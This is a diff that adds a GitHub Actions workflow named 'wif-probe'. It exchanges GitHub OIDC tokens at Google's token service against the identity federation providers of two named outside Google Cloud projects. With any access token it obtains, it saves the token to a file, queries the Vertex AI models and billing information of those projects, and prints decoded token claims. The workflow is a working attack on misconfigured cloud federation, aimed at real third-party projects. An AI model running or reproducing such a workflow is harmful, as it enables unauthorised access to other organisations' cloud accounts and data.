@@ -1,0 +1,57 @@
+name: wif-probe
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          echo "request_url_host=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | cut -d'?' -f1)"
+          cat > audiences.txt <<'AUD'
+          https://iam.googleapis.com/projects/533362582499/locations/global/workloadIdentityPools/github/providers/electricitymaps-contrib|tmrow-152415
+          https://iam.googleapis.com/projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider|zuplo-marketing
+          AUD
+          while IFS='|' read -r AUD PROJ; do
+            echo "=== AUDIENCE $AUD project=$PROJ ==="
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+            echo "$J" > raw.json
+            jq -r '.value // empty' raw.json > tok.jwt
+            if [ ! -s tok.jwt ]; then echo "NO_OIDC_TOKEN"; cat raw.json; continue; fi
+            echo "oidc_header=$(cut -d. -f1 tok.jwt | head -c 100)"
+            STS="//iam.googleapis.com/${AUD#https://iam.googleapis.com/}"
+            echo "sts_audience=$STS"
+            code=$(curl -s -o resp.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=$STS" \
+              --data-urlencode "subject_token=$(cat tok.jwt)" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token")
+            echo "STS_HTTP=$code"
+            head -c 900 resp.json; echo
+            AT=$(jq -r '.access_token // empty' resp.json)
+            if [ -n "$AT" ]; then
+              echo "GOT_ACCESS_TOKEN len=${#AT}"
+              echo "$AT" > at_$PROJ.txt
+              echo "--- tokeninfo ---"
+              curl -s -o ti.json -w 'TOKENINFO_HTTP=%{http_code}\n' "https://oauth2.googleapis.com/tokeninfo?access_token=$AT"
+              head -c 700 ti.json; echo
+              echo "--- vertex models ---"
+              curl -s -o ai.json -w 'VERTEX_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$PROJ/locations/us-central1/models"
+              head -c 1200 ai.json; echo
+              echo "--- billing ---"
+              curl -s -o bill.json -w 'BILLING_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/$PROJ/billingInfo"
+              head -c 700 bill.json; echo
+            fi
+          done < audiences.txt
+      - name: echo-token-claims
+        run: |
+          J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/projects/533362582499/locations/global/workloadIdentityPools/github/providers/electricitymaps-contrib")
+          P=$(echo "$J" | jq -r '.value // empty' | cut -d. -f2)
+          pad=$(( (4 - ${#P} % 4) % 4 )); P="$P$(printf '=%.0s' $(seq 1 $pad))"
+          echo "$P" | tr '_-' '/+' | base64 -d 2>/dev/null; echo
